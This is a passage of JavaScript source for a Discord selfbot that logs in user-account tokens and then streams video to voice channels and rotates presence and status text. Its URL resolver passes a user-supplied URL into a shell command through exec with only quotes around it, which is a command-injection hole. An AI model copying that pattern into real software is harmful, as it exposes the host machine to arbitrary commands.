          if (!channelId || !url) return fuck_logger("warning", `Usage: ${prefix} ${command} <channelId> <url>`);
          await this.playVideoStream(channelId, url);
          break;

        case "stop-stream":
          this.stopStream();
          break;

        case "leave":
          this.stopStream();
          if (channelId) this.disconnectFromVoiceChannel(channelId);
          else {
            this.streamer.leaveVoice();
            for (const [id] of this.voiceConnections) this.disconnectFromVoiceChannel(id);
          }
          break;

        case "list":
          fuck_logger("success", "Available voice channels:");
          this.channels.cache.forEach(ch => {
            if (ch.type === 2 || ch.type === "GUILD_VOICE") {
              console.log(`- ${ch.name} (${ch.id})`);
            }
          });
          break;

        default:
          fuck_logger("warning", `Unknown command: ${command}`);
          break;
      }
    } catch (err) {
      fuck_logger("error", `Error processing voice command: ${err.message}`);
    }
  }


  async resolveStreamUrl(url) {
    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execAsync = promisify(exec);

    const needsResolution = /youtube\.com|youtu\.be|twitch\.tv|twitter\.com|x\.com/i.test(url);

    if (!needsResolution) {
      return url;
    }

    fuck_logger("log", "Resolving stream URL...");

    try {
      if (/youtube\.com|youtu\.be/i.test(url)) {
        const commands = [
          { cmd: 'yt-dlp', args: '-f 18 --get-url' },
          { cmd: 'yt-dlp', args: '-f "bestvideo[ext=mp4][protocol=https]+bestaudio[ext=m4a][protocol=https]/best[protocol=https][protocol!*=m3u]" --get-url' },
          { cmd: 'yt-dlp', args: '-f "best[protocol=https][protocol!*=m3u]" --get-url' },
          { cmd: 'yt-dlp', args: '-f "best" --get-url --no-check-formats' },
          { cmd: 'youtube-dl', args: '-f 18 -g' }
        ];

        for (const { cmd, args } of commands) {
          try {
            fuck_logger("log", `Trying ${cmd} with format selection...`);
            const { stdout, stderr } = await execAsync(`${cmd} ${args} "${url}"`, { timeout: 20000 });
            const resolvedUrl = stdout.trim().split('\n')[0];

            if (resolvedUrl && resolvedUrl.startsWith('http')) {
              if (resolvedUrl.includes('.m3u8') || resolvedUrl.includes('/manifest/')) {
                fuck_logger("warning", "Skipping HLS manifest URL, trying next format...");
                continue;
              }
              fuck_logger("success", `Stream URL resolved with ${cmd}`);
              return resolvedUrl;
            }
          } catch (cmdError) {
            fuck_logger("warning", `${cmd} with these args failed, trying next...`);
            continue;
          }
        }
      }

      if (/youtube\.com|youtu\.be/i.test(url)) {
        try {
          const ytdl = require('ytdl-core');
          fuck_logger("log", "Using ytdl-core to resolve YouTube URL...");

          const info = await ytdl.getInfo(url);
          const format = ytdl.chooseFormat(info.formats, {
            quality: 'highest',
            filter: (format) => format.hasVideo && format.hasAudio
          });

          if (format && format.url) {
            fuck_logger("success", "YouTube URL resolved with ytdl-core");
            return format.url;
          }
        } catch (ytdlError) {
          fuck_logger("warning", `ytdl-core failed: ${ytdlError.message}`);
        }
      }

      const commands = [
        'yt-dlp -f "best[ext=mp4]/best" --get-url',
        'youtube-dl -f "best[ext=mp4]/best" -g'
      ];

      for (const cmd of commands) {
        try {
          const { stdout } = await execAsync(`${cmd} "${url}"`, { timeout: 15000 });
          const resolvedUrl = stdout.trim().split('\n')[0];
          fuck_logger("success", `Stream URL resolved with ${cmd.split(' ')[0]}`);
          return resolvedUrl;
        } catch (cmdError) {
          fuck_logger("warning", `${cmd.split(' ')[0]} not available or failed`);
          continue;
        }
      }

      throw new Error("No URL resolver available");

    } catch (error) {
      fuck_logger("error", `Failed to resolve URL: ${error.message}`);
      fuck_logger("warning", "Install one of these URL resolvers:");
      fuck_logger("warning", "  Option 1: pip install yt-dlp (recommended)");
      fuck_logger("warning", "  Option 2: Download yt-dlp.exe from https://github.com/yt-dlp/yt-dlp/releases");
      fuck_logger("warning", "  Option 3: npm install ytdl-core (may not work with recent YouTube changes)");
      throw new Error("Could not resolve streaming URL. Install yt-dlp.");
    }
  }

  async playVideoStream(channelId, url) {
    try {
      const channel = this.channels.cache.get(channelId);
      if (!channel) {
        fuck_logger("error", `Channel ${channelId} not found`);
        return;
      }

      const isVoice =
        channel.type === 2 || channel.type === "GUILD_VOICE" || channel.type === 13;
      if (!isVoice) {
        fuck_logger("error", `Channel ${channelId} is not a voice channel`);
        return;
      }

      const current = this.user?.voice?.channelId;
      if (current) {
        if (current === channelId) {
          fuck_logger("log", `Already connected to ${channelId}, proceeding with stream...`);
        } else {
          fuck_logger("log", `Already in ${current}, leaving before rejoining...`);
          await this.streamer.leaveVoice().catch(() => { });
          fuck_logger("log", `Joining voice channel ${channel.guild.id}/${channelId}`);
          await this.streamer.joinVoice(channel.guild.id, channelId);
        }
      } else {
        fuck_logger("log", `Joining voice channel ${channel.guild.id}/${channelId}`);
        await this.streamer.joinVoice(channel.guild.id, channelId);
      }

      const { StageChannel } = require("discord.js-selfbot-v13");
      if (channel instanceof StageChannel) {
        await this.user?.voice?.setSuppressed(false).catch(() => { });
      }

      if (this.streamController) {
        fuck_logger("log", "Stopping existing stream before starting new one...");
        this.streamController.abort();
      }
      this.streamController = new AbortController();

      fuck_logger("success", `Preparing stream from: ${url}`);

      let streamUrl;
      try {
        streamUrl = await this.resolveStreamUrl(url);
      } catch (resolveError) {
        fuck_logger("error", resolveError.message);
        this.streamer.leaveVoice();
        return;
      }

      fuck_logger("log", `Using resolved URL for streaming`);

      const { command, output } = prepareStream(
        streamUrl,
        {
          width: this.streamConfig.width,
          height: this.streamConfig.height,
          frameRate: this.streamConfig.fps,
          bitrateVideo: this.streamConfig.bitrateKbps,
          bitrateVideoMax: this.streamConfig.maxBitrateKbps,
          hardwareAcceleratedDecoding: this.streamConfig.hardwareAcceleration,
          videoCodec: Utils.normalizeVideoCodec(this.streamConfig.videoCodec)
        },
        this.streamController.signal
      );

      command.on("error", (err) => {
        fuck_logger("error", "FFmpeg error occurred");
        fuck_logger("error", err.message);
      });

      fuck_logger("success", `Starting video stream in ${channel.name}`);

      await playStream(output, this.streamer, undefined, this.streamController.signal)
        .catch((err) => {
          fuck_logger("error", `Stream playback error: ${err.message}`);
          this.streamController?.abort();
        });

      this.isRunningStream = true;
      this.voiceConnections.set(channelId, { channel, streaming: true });

    } catch (error) {
      fuck_logger("error", `Failed to play video stream: ${error.message}`);
      this.stopStream();
    }
  }

  stopStream() {
    if (this.streamController) {
      fuck_logger("log", "Stopping video stream...");
      this.streamController.abort();
      this.streamController = null;
      this.isRunningStream = false;
      fuck_logger("success", "Video stream stopped");
    } else {
      fuck_logger("warning", "No active stream to stop");
    }
  }

  async connectToVoiceChannel(channelId, selfMute = true, selfDeaf = true, createStream = false) {
    try {
      const channel = this.channels.cache.get(channelId);
      if (!channel) {
        fuck_logger("error", `Channel ${channelId} not found`);
        return null;
      }

      if (channel.type !== 2 && channel.type !== 'GUILD_VOICE') {
        fuck_logger("error", `Channel ${channelId} is not a voice channel`);
        return null;
      }

      const connectionOptions = { selfMute, selfDeaf, selfVideo: false };
      let connection;

      try {
        connection = await this.voice.joinChannel(channel, connectionOptions);
      } catch (error) {
        fuck_logger("error", `Failed to connect to ${channel.name}: ${error.message}`);
        return null;
      }

      if (!connection) {
        fuck_logger("error", `Failed to connect to ${channel.name}`);
        return null;
      }

      fuck_logger("success", `Connected to voice channel: ${channel.name}`);
      this.voiceConnections.set(channelId, connection);

      if (createStream) {
        try {
          const { createAudioPlayer, createAudioResource } = require('@discordjs/voice');
          const player = createAudioPlayer();
          const resource = createAudioResource('./audio.mp3');
          player.play(resource);
          connection.subscribe(player);

          fuck_logger("success", `Audio stream started in ${channel.name}`);
        } catch (streamError) {
          fuck_logger("error", `Failed to create stream in ${channel.name}: ${streamError.message}`);
        }
      }

      return connection;
    } catch (error) {
      fuck_logger("error", `Failed to connect to voice channel ${channelId}: ${error.message}`);
      return null;
    }
  }

  disconnectFromVoiceChannel(channelId) {
    try {
      const connection = this.voiceConnections.get(channelId);
      if (connection) {
        if (connection.disconnect) {
          connection.disconnect();
        }
        this.voiceConnections.delete(channelId);
        fuck_logger("success", `Disconnected from channel ${channelId}`);
      } else {
        fuck_logger("warning", `No active connection found for channel ${channelId}`);
      }
    } catch (error) {
      fuck_logger("error", `Error disconnecting from voice channel: ${error.message}`);
    }
  }

  startPingChecker() {
    const checkerId = setInterval(() => {
      if (this.isRunningStream) return;

      try {
        if (this.ws && this.ws.status === 0 && this.ws.ping < 3000) {
          if (this.restartCount > 0) {
            fuck_logger("success", `Connection stabilized for token: ${this.maskToken(this.TOKEN)}`);
            this.restartCount = 0;
          }
        }
      } catch (err) {
        fuck_logger("error", `Error in ping checker: ${err.message}`);
      }
    }, 30000);

    this.intervals.add(checkerId);
  }

  getDefaultActivityName(activityType, platform) {
    if (platform) return platform;

    switch (activityType) {
      case "STREAMING":
        return "Streaming";
      case "PLAYING":
        return "Playing";
      case "LISTENING":
        return "Listening to";
      case "WATCHING":
        return "Watching";
      case "COMPETING":
        return "Competing in";
      default:
        return "Activity";
    }
  }

  async streaming() {
    if (this.isRunningStream) return;

    this.isRunningStream = true;
    try {
      const currentTime = Date.now();
      let connectionHasIssues = false;

      if (!this.ws || this.ws.status !== 0) {
        connectionHasIssues = true;
      } else if (this.ws.ping > 5000) {
        connectionHasIssues = true;
      }

      if (connectionHasIssues) {
        if (this.restartCount < 5 && currentTime - this.lastRestartTime > 60000) {
          this.lastRestartTime = currentTime;
          this.restartCount++;
          fuck_logger("warning", `Connection issues detected, reconnection attempt #${this.restartCount}`);
          setTimeout(() => this.streaming(), Math.max(10000, this.rpcConfig.delay));
          this.isRunningStream = false;
          return;
        }
      }

      const watchUrls = [];
      if (this.rpcConfig.twitchURL) watchUrls.push(this.rpcConfig.twitchURL);
      if (this.rpcConfig.youtubeURL) watchUrls.push(this.rpcConfig.youtubeURL);

      let watchUrl = null;
      if (watchUrls.length > 0) {
        watchUrl = watchUrls[this.index.url % watchUrls.length];
      }

      if (this.activityType === "STREAMING") {
        if (!watchUrl || !this.getExternal.isValidURL(watchUrl)) {
          fuck_logger("warning", "No valid streaming URL found for STREAMING type. Using fallback URL.");
          watchUrl = "https://www.twitch.tv/4levy_z1";
        }
      }

      let platform = "";
      if (watchUrl) {
        if (watchUrl.includes("twitch.tv")) {
          platform = "Twitch";
        } else if (watchUrl.includes("youtube.com") || watchUrl.includes("youtu.be")) {
          platform = "YouTube";
        } else if (watchUrl.includes("spotify.com")) {
          platform = "Spotify";
        } else {
          platform = "Custom";
        }
      }

      const presence = new RichPresence(this)
        .setApplicationId("1438613688406769778")
        .setType(this.activityType);

      if (this.activityType === "LISTENING") {
        if (this.rpcConfig.timestamp && this.rpcConfig.timestamp.start && this.rpcConfig.timestamp.end) {
          const start = this.parseTimestamp(this.rpcConfig.timestamp.start);
          const end = this.parseTimestamp(this.rpcConfig.timestamp.end);
          if (start && end) {
            const total = end - start;
            const current = Date.now() % total;
            presence.setStartTimestamp(Date.now() - current)
              .setEndTimestamp(Date.now() + (total - current));
          }
        }
      } else if (this.activityType === "STREAMING" && watchUrl) {
        presence.setURL(watchUrl);
      }

      const details = this.getNextItem(this.rpcConfig.details, 'details');
      let activityName;

      if (this.activityType === "STREAMING" && platform) {
        if (platform === "Twitch") {
          activityName = "Twitch";
        } else if (platform === "YouTube") {
          activityName = "YouTube";
        } else if (platform === "Spotify") {
          activityName = "Spotify";
        } else {
          activityName = platform;
        }
      } else {
        activityName = this.SPT(details) || this.getDefaultActivityName(this.activityType, platform);
      }

      presence.setName(activityName);

      // Set details
      if (details) {
        presence.setDetails(this.SPT(details));
      }

      // Set state
      const state = this.getNextItem(this.rpcConfig.state, 'state');
      if (state) {
        presence.setState(this.SPT(state));
      }

      // Set assets
      const largeText = this.getNextItem(this.rpcConfig.assetsLargeText, 'assetsLargeText');
      if (largeText) {
        presence.setAssetsLargeText(this.SPT(largeText));
      }

      const smallText = this.getNextItem(this.rpcConfig.assetsSmallText, 'assetsSmallText');
      if (smallText) {
        presence.setAssetsSmallText(this.SPT(smallText));
      }

      const largeImage = this.getNextItem(this.rpcConfig.assetsLargeImage, 'assetsLargeImage');
      const smallImage = this.getNextItem(this.rpcConfig.assetsSmallImage, 'assetsSmallImage');

      if (largeImage || smallImage) {
        try {
          const processedLargeImage = largeImage ? this.SPT(largeImage) : null;
          const processedSmallImage = smallImage ? this.SPT(smallImage) : null;

          const images = await this.getImage(processedLargeImage, processedSmallImage);
          if (images.bigImage) {
            presence.setAssetsLargeImage(images.bigImage);
          }
          if (images.smallImage) {
            presence.setAssetsSmallImage(images.smallImage);
          }
        } catch (imgError) {
          fuck_logger("warning", `Failed to set images: ${imgError.message}`);
        }
      }

      if (this.rpcConfig.timestamp.start || this.rpcConfig.timestamp.end) {
        if (this.rpcConfig.timestamp.start) {
          const start = this.parseTimestamp(this.rpcConfig.timestamp.start);
          if (start) presence.setStartTimestamp(start);
        }
        if (this.rpcConfig.timestamp.end) {
          const end = this.parseTimestamp(this.rpcConfig.timestamp.end);
          if (end) presence.setEndTimestamp(end);
        }
      }

      if (this.rpcConfig.buttonFirst && this.rpcConfig.buttonFirst.length > 0) {
        try {
          const button1 = this.rpcConfig.buttonFirst[0];
          if (button1 && button1.label && button1.url) {
            presence.addButton(this.SPT(button1.label), button1.url);
          }
        } catch (buttonError) {
          fuck_logger("warning", `Failed to add button 1: ${buttonError.message}`);
        }
      }

      if (this.rpcConfig.buttonSecond && this.rpcConfig.buttonSecond.length > 0) {
        try {
          const button2 = this.rpcConfig.buttonSecond[0];
          if (button2 && button2.label && button2.url) {
            presence.addButton(this.SPT(button2.label), button2.url);
          }
        } catch (buttonError) {
          fuck_logger("warning", `Failed to add button 2: ${buttonError.message}`);
        }
      }

      if (this.customStatusEnabled) {
        this.currentStreamingActivity = presence;
      } else {
        try {
          await this.user?.setPresence({
            activities: [presence],
            status: "online",
          });
        } catch (presenceError) {
          fuck_logger("warning", `Failed to update presence: ${presenceError.message}`);
        }
      }

      this.updateIndices();

      setTimeout(() => this.streaming(), this.rpcConfig.delay);
    } catch (error) {
      fuck_logger("error", `Error in streaming method: ${error.message}`);
      setTimeout(() => this.streaming(), 30000);
    } finally {
      this.isRunningStream = false;
    }
  }

  updateIndices() {
    this.lib.count++;

    const urlCount = [this.rpcConfig.twitchURL, this.rpcConfig.youtubeURL].filter(Boolean).length;
    this.index.url = (this.index.url + 1) % Math.max(1, urlCount);

    this.index.bt_1 = (this.index.bt_1 + 1) % Math.max(1, this.rpcConfig.buttonFirst?.length || 1);
    this.index.bt_2 = (this.index.bt_2 + 1) % Math.max(1, this.rpcConfig.buttonSecond?.length || 1);
  }

  async customStatus() {
    try {
      if (!this.statusConfig || !this.statusConfig.data) {
        fuck_logger("warning", "No status configuration found");
        return;
      }

      const statusData = this.statusConfig.data;
      const delay = Math.max(this.statusConfig.delay || 4000, 4000);

      if (!Array.isArray(statusData) || statusData.length === 0) {
        fuck_logger("warning", "No status data available");
        return;
      }

      const currentStatus = statusData[this.index.status];
      if (!currentStatus) {
        this.index.status = 0;
        return;
      }

      let emoji = "";
      let text = "";

      if (typeof currentStatus === "string") {
        const spaceIndex = currentStatus.indexOf(" ");
        if (spaceIndex > 0) {
          emoji = currentStatus.substring(0, spaceIndex).trim();
          text = currentStatus.substring(spaceIndex + 1).trim();
        } else {
          text = currentStatus.trim();
        }
      } else if (typeof currentStatus === "object") {
        emoji = currentStatus.emoji || "";
        text = currentStatus.text || "";
      }

      const customStatus = new CustomStatus(this)
        .setEmoji(this.replaceVariables(emoji))
        .setState(this.replaceVariables(text));

      const currentPresence = this.user?.presence;
      const activities = [customStatus];

      if (this.currentStreamingActivity) {
        activities.push(this.currentStreamingActivity);
      }

      await this.user?.setPresence({
        activities: activities,
        status: currentPresence?.status || "online",
      });

      this.index.status = (this.index.status + 1) % statusData.length;

      setTimeout(() => this.customStatus(), delay);

    } catch (error) {
      fuck_logger("error", `Custom status error: ${error.message}`);
      setTimeout(() => this.customStatus(), 10000);
    }
  }

  async getImage(bigImg, smallImg) {
    try {
      const validBigImg = bigImg && bigImg.trim() && this.getExternal.isValidURL(bigImg) ? bigImg : null;
      const validSmallImg = smallImg && smallImg.trim() && this.getExternal.isValidURL(smallImg) ? smallImg : null;

      if (!validBigImg && !validSmallImg) {
        return { bigImage: null, smallImage: null };
      }

      const cachedBigImage = validBigImg ? this.cacheImage.get(validBigImg) : null;
      const cachedSmallImage = validSmallImg ? this.cacheImage.get(validSmallImg) : null;

      let fetchedImages = { bigImage: null, smallImage: null };
      try {
        fetchedImages = await this.getExternal.get(validBigImg, validSmallImg);
      } catch (error) {
        fuck_logger("warning", `Error fetching images: ${error.message}`);
      }

      const finalBigImage = fetchedImages.bigImage || cachedBigImage || null;
      const finalSmallImage = fetchedImages.smallImage || cachedSmallImage || null;

      if (fetchedImages.bigImage && validBigImg) this.cacheImage.set(validBigImg, fetchedImages.bigImage);
      if (fetchedImages.smallImage && validSmallImg) this.cacheImage.set(validSmallImg, fetchedImages.smallImage);

      return { bigImage: finalBigImage, smallImage: finalSmallImage };
    } catch (error) {
      fuck_logger("warning", `Image processing error: ${error.message}`);
      return { bigImage: null, smallImage: null };
    }
  }

  getNextItem(array, indexKey) {
    if (!array || array.length === 0) return null;
    const item = array[this.index[indexKey] % array.length];
    this.index[indexKey]++;
    return item;
  }

  parseTimestamp(timestamp) {
    if (!timestamp) return null;
    if (typeof timestamp === 'number') return timestamp;
    if (typeof timestamp === 'string') {
      const date = new Date(timestamp);
      return date.getTime();
    }
    return null;
  }

  SPT(text) {
    if (!text) return text || null;

    try {
      const { weather, sys, emoji, textFont } = this;
      const currentMoment = moment()
        .locale("th")
        .tz(weather.tz || this.config.OPTIONS?.tz || this.config.options?.tz || "Asia/Bangkok");

      const day = currentMoment.date();
      const daySuffix = (d) => {
        if (d > 3 && d < 21) return "th";
        switch (d % 10) {
          case 1: return "st";
          case 2: return "nd";
          case 3: return "rd";
          default: return "th";
        }
      };
      const dayWithSuffix = `${day}${daySuffix(day)}`;
      const currentMomentEN = currentMoment.clone().locale("en");

      const variables = {
        // Time
        "hour:1": currentMoment.format("HH"),
        "hour:2": currentMoment.format("hh"),
        "min:1": currentMoment.format("mm"),
        "min:2": currentMoment.format("mm A"),
        // Time (EN)
        "time:en:24": currentMomentEN.format("HH:mm"),
        "time:en:12": currentMomentEN.format("hh:mm A"),
        "hour:en": currentMomentEN.format("hh"),
        "minute:en": currentMomentEN.format("mm"),
        "ampm:en": currentMomentEN.format("A"),
        // Thai Date
        "th=date": currentMoment.format("D"),
        "th=week:1": currentMoment.format("ddd"),
        "th=week:2": currentMoment.format("dddd"),
        "th=month:1": currentMoment.format("M"),
        "th=month:2": currentMoment.format("MMM"),
        "th=month:3": currentMoment.format("MMMM"),
        "th=year:1": (parseInt(currentMoment.format("YYYY")) + 543).toString().slice(-2),
        "th=year:2": (parseInt(currentMoment.format("YYYY")) + 543).toString(),
        // English Date
        "en=date": currentMoment.locale("en").format("Do"),
        "en=week:1": currentMoment.locale("en").format("ddd"),
        "en=week:2": currentMoment.locale("en").format("dddd"),
        "en=month:1": currentMoment.locale("en").format("M"),
        "en=month:2": currentMoment.locale("en").format("MMM"),
        "en=month:3": currentMoment.locale("en").format("MMMM"),
        "en=year:1": currentMoment.locale("en").format("YY"),
        "en=year:2": currentMoment.locale("en").format("YYYY"),
        // Weather
        "city": weather.name || "Unknown",
        "region": weather.region || "",
        "country": weather.country || "",
        "lat": weather.lat || 0,
        "lon": weather.lon || 0,
        "tz_id": weather.tz_id || "",
        "localtime": weather.localtime || "",
        "last_updated": weather.last_updated || "",
        "temp:c": weather.temp_c ?? 0,
        "temp:f": weather.temp_f ?? 32,
        "is_day": weather.is_day ?? 0,
        "condition:text": weather.condition?.text || "",
        "condition:icon": weather.condition?.icon || "",
        "condition:code": weather.condition?.code || 0,
        "wind:kph": weather.wind_kph ?? 0,
        "wind:mph": weather.wind_mph ?? 0,
        "wind:degree": weather.wind_degree ?? 0,
        "wind:dir": weather.wind_dir || "N",
        "gust:kph": weather.gust_kph ?? 0,
        "gust:mph": weather.gust_mph ?? 0,
        "pressure:mb": weather.pressure_mb ?? 1013,
        "pressure:in": weather.pressure_in ?? 29.92,
        "precip:mm": weather.precip_mm ?? 0,
        "precip:in": weather.precip_in ?? 0,
        "humidity": weather.humidity ?? 50,
        "cloud": weather.cloud ?? 0,
        "feelslike:c": weather.feelslike_c ?? 0,
        "feelslike:f": weather.feelslike_f ?? 32,
        "windchill:c": weather.windchill_c ?? 0,
        "windchill:f": weather.windchill_f ?? 32,
        "heatindex:c": weather.heatindex_c ?? 0,
        "heatindex:f": weather.heatindex_f ?? 32,
        "dewpoint:c": weather.dewpoint_c ?? 0,
        "dewpoint:f": weather.dewpoint_f ?? 32,
        "uv": weather.uv ?? 0,
        "vis:km": weather.vis_km ?? 10,
        "vis:mi": weather.vis_miles ?? 6.2,
        "co": weather.co ?? 0,
        "no2": weather.no2 ?? 0,
        "o3": weather.o3 ?? 0,
        "so2": weather.so2 ?? 0,
        "pm2.5": weather.pm2_5 ?? 0,
        "pm10": weather.pm10 ?? 0,
        "us_epa_index": weather.us_epa_index ?? 0,
        "gb_defra_index": weather.gb_defra_index ?? 0,

        // System
        "ping": Math.round(this.ws?.ping || 0),
        "cpu:name": sys.cpuName || "CPU",
        "cpu:cores": sys.cpuCores || 1,
        "cpu:speed": sys.cpuSpeedGHz || "0.0",
        "cpu:usage": sys.cpuUsage || 0,
        "ram:usage": sys.ramUsage || 0,
        "uptime:days": Math.trunc(os.uptime() / 86400),
        "uptime:hours": Math.trunc((os.uptime() / 3600) % 24),
        "uptime:minutes": Math.trunc((os.uptime() / 60) % 60),
        "uptime:seconds": Math.trunc(os.uptime() % 60),

        // User
        "user:name": this.user?.username || "User",
        "user:icon": this.user?.displayAvatarURL({ dynamic: true, size: 1024 }) || "",
        "user:banner": this.user?.bannerURL({ dynamic: true, size: 1024 }) || "",
        "guild=members": (guildId) => {
          try {
            return this.guilds.cache.get(guildId)?.memberCount || "?";
          } catch (e) {
            return "?";
          }
        },
        "guild=name": (guildId) => {
          try {
            return this.guilds.cache.get(guildId)?.name || "Unknown";
          } catch (e) {
            return "Unknown";
          }
        },
        "guild=icon": (guildId) => {
          try {
            return this.guilds.cache.get(guildId)?.iconURL() || "";
          } catch (e) {
            return "";
          }
        },
        "emoji:time": emoji.getTime(currentMoment.format("HH")),
        "emoji:clock": () => emoji.getClock(currentMoment.format("HH")),
        random: (text) => {
          try {
            const options = text.split(",").map((t) => t.trim());
            return options[Math.floor(Math.random() * options.length)];
          } catch (e) {
            return text;
          }
        },
      };

      const processFont = (fontNum, content) => {
        try {
          const processedContent = content.replace(
            /\{([^{}]+)\}/g,
            (_, key) => {
              if (key in variables) {
                const value = variables[key];
                return typeof value === 'function' ? (value() ?? "") : (value ?? "");
              }

              if (key.includes(':')) {
                const [funcName, param] = key.split(':', 2);
                if (funcName in variables && typeof variables[funcName] === 'function') {
                  try {
                    return variables[funcName](param) ?? "";
                  } catch (e) {
                    return key;
                  }
                }
              }

              return key;
            }
          );
          return (
            textFont[`getFont${fontNum}`]?.(processedContent) ||
            processedContent
          );
        } catch (e) {
          return content;
        }
      };

      const processText = (input) => {
        try {
          return input
            .replace(/\{NF(\d)\((.*?)\)\}/g, (_, num, content) => {
              return processFont(num, content);
            })
            .replace(/\{([^{}]+)\}/g, (_, key) => {
              if (key in variables) {
                const value = variables[key];
                return typeof value === 'function' ? (value() ?? "") : (value ?? "");
              }
              if (key.includes(':')) {
                const [funcName, param] = key.split(':', 2);
                if (funcName in variables && typeof variables[funcName] === 'function') {
                  try {
                    return variables[funcName](param) ?? "";
                  } catch (e) {
                    return key;
                  }
                }
              }

              return key;
            });
        } catch (e) {
          return input;
        }
      };

      let result = text;
      let prev;
      let iterations = 0;
      const MAX_ITERATIONS = 5;

      do {
        prev = result;
        result = processText(prev);
        iterations++;
      } while (result !== prev && iterations < MAX_ITERATIONS);

      return result;
    } catch (error) {
      fuck_logger("error", `Error in SPT: ${error.message}`);
      return text;
    }
  }

  replaceVariables(text) {
    return this.SPT(text);
  }

  startInterval(callback, interval) {
    const id = setInterval(callback, interval);
    this.intervals.add(id);
    return id;
  }

  stopAllIntervals() {
    for (let id of this.intervals) clearInterval(id);
    this.intervals.clear();

    for (const [channelId, connection] of this.voiceConnections) {
      try {
        connection.disconnect();
      } catch (error) {
        fuck_logger("warning", `Error disconnecting from voice channel ${channelId}: ${error.message}`);
      }
    }
    this.voiceConnections.clear();
  }

  maskToken(token) {
    const parts = token.split(".");
    if (parts.length < 2) return token;
    return `${parts[0]}.##########`;
  }

  async start() {
    try {
      try {
        await this.weather.update();
        await this.sys.update();
      } catch (initError) {
        fuck_logger("warning", `Info initialization error: ${initError.message}`);
      }

      const originalLoginMethod = this.login;
      this.login = async function (token) {
        try {
          try {
            const path = require.resolve("discord.js-selfbot-v13");
            const basePath = path.substring(0, path.indexOf("node_modules") + "node_modules".length);
            const READYPath = `${basePath}/discord.js-selfbot-v13/src/client/websocket/handlers/READY`;
            const READY = require(READYPath);

            const originalHandler = READY.exports;
            READY.exports = function (client, packet) {
              if (packet && packet.d && packet.d.user_settings) {
                if (!packet.d.user_settings.friend_source_flags) {
                  packet.d.user_settings.friend_source_flags = { all: false };
                }
              }
              return originalHandler(client, packet);
            };
            fuck_logger("success", "Successfully patched READY handler");
          } catch (e) {
            fuck_logger("warning", `Failed to patch READY handler: ${e.message}`);
          }

          return await originalLoginMethod.call(this, token);
        } catch (loginError) {
          fuck_logger("error", `Login error: ${loginError.message}`);
          throw loginError;
        }
      };

      await this.login(this.TOKEN);

      this.lib.timestamp = Date.now();
      const updateInterval = 60000;
      this.startInterval(() => this.sys.update(), updateInterval);

      await this.streaming();

      return {
        success: true,
        username: this.user?.tag || "Unknown",
      };
    } catch (error) {
      fuck_logger("error", `Client start error: ${error.message}`);
      this.destroy();
      return { success: false, error: error.message };
    }
  }

  end() {
    try {
      this.stopAllIntervals();
      this.destroy();
    } catch (error) {
      fuck_logger("error", `Error during client cleanup: ${error.message}`);
    }
  }
}

class nyx {
  constructor() {
    this.activeClients = new Map();
  }

  async startStream(config) {
    try {
      const inputs = config.INPUTS || config.inputs || [];
      const inputArray = Array.isArray(inputs) ? inputs : [inputs];

      const enabledTokens = inputArray.filter(input => input.ignore !== true && input.token);

      if (enabledTokens.length === 0) {
        fuck_logger("error", "No valid tokens found in configuration");
        return { success: false, error: "No valid tokens" };
      }

      let successCount = 0;
      let failedCount = 0;

      for (const input of enabledTokens) {
        try {
          // Support both encrypted (ENC::...) and plain tokens
          const token = TokenCrypto.resolveToken(input.token);

          if (!token || token.includes("SELFBOT TOKEN")) {
            fuck_logger("warning", "Invalid token format, skipping");
            failedCount++;
            continue;
          }

          const client = new NyxClient(token, config);
          const result = await client.start();

          if (result.success) {
            this.activeClients.set(token, client);
            successCount++;
            fuck_logger("success", `READY: [${result.username}]`);
          } else {
            failedCount++;
            fuck_logger("error", `Failed to start token: ${client.maskToken(token)}`);
          }
        } catch (error) {
          failedCount++;
          fuck_logger("error", `Error with token: ${error.message}`);
        }
      }

      if (successCount > 0) {
        return {
          success: true,
          successCount,
          failedCount,
          totalCount: enabledTokens.length,
        };
      }

      return {
        success: false,
        failedCount,
        totalCount: enabledTokens.length,
      };
    } catch (error) {
      fuck_logger("error", `Stream start error: ${error.message}`);
      return { success: false, error: error.message };
    }
  }

  async stopStream() {
    try {
      for (const client of this.activeClients.values()) {
        client.end();
      }
      this.activeClients.clear();
      return true;
    } catch (error) {
      fuck_logger("error", `Error stopping streams: ${error.message}`);
      return false;
    }
  }
}

async function main() {
  try {
    console.clear();
    const rainbow = chalkAnimation.radar(ASCII);

    await new Promise(resolve => setTimeout(resolve, 2000));
    rainbow.stop();
    console.clear();
    console.log(ASCII)
    console.log('\n');

    const streamManager = new nyx();

    fuck_logger("success", "Loaded");

    const result = await streamManager.startStream(config);

    if (result.success) {
      fuck_logger("success", `Successfully started ${result.successCount}/${result.totalCount} client(s)`);
      if (result.failedCount > 0) {
        fuck_logger("warning", `Failed to start ${result.failedCount} client(s)`);
      }

      process.on('SIGINT', async () => {
        fuck_logger("info", "Shutting down gracefully...");
        await streamManager.stopStream();
        process.exit(0);
      });

    } else {
      fuck_logger("error", `Failed to start any clients. ${result.failedCount || 0} token(s) failed`);
      process.exit(1);
    }

  } catch (error) {
    fuck_logger("error", `Error starting the bot: ${error.message}`);
    process.exit(1);
  }
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = new nyx();